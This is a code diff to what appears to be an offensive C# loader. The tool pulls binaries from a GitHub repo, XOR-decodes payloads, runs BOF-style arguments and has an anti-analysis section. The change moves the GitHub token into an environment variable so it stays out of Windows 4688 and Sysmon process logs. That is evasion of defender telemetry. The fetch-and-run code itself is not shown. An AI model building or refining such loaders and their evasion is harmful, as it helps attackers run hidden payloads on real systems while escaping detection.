@@ -439,7 +439,7 @@ Required:
 
 Payload options:
   --branch     <branch>               Repo branch              (default: main)
-  --token      <PAT>                  GitHub PAT for private repos
+  --token      <PAT>                  GitHub PAT for private repos (legacy; prefer RL_GH_TOKEN env var)
   --xor        <byte>                 XOR key (0-255) to decode payload before loading
   --list                              Print available binaries and exit
   --exec       <name>                 Select binary by name/substring, skip menu
@@ -618,7 +618,7 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
                 switch (cliArgs[i])
                 {
                     case "--repo"      when i + 1 < cliArgs.Length: repoPath = cliArgs[++i]; break;
-                    case "--token"     when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break;
+                    case "--token"     when i + 1 < cliArgs.Length: token    = cliArgs[++i]; break; // legacy; prefer RL_GH_TOKEN env
                     case "--branch"    when i + 1 < cliArgs.Length: branch   = cliArgs[++i]; break;
                     case "--xor"       when i + 1 < cliArgs.Length:
                         if (byte.TryParse(cliArgs[++i], out byte k)) xorKey = k;
@@ -651,6 +651,22 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
                 Err("--repo is required.  Example: --repo owner/name/subfolder");
                 PrintHelp();
                 return 1;
+            }
+
+            // -- token never travels on the command line: argv leaks via 4688 /
+            //    Sysmon-1 process timelines and shell history. Resolution order:
+            //    env RL_GH_TOKEN -> stdin prompt (only when auth is needed).
+            if (string.IsNullOrEmpty(token))
+            {
+                token = Environment.GetEnvironmentVariable("RL_GH_TOKEN") ?? "";
+                if (!string.IsNullOrEmpty(token))
+                    Warn("token: RL_GH_TOKEN environment variable");
+                else if (!listOnly)
+                    Warn("no token: GitHub API rate limit is 60 req/h; set RL_GH_TOKEN for private repos and 5000/h");
+            }
+            else
+            {
+                Warn("--token still accepted, but prefer RL_GH_TOKEN: command-line secrets leak via process timelines");
             }
 
             // -- Anti-analysis (silent: failures bail quietly) --
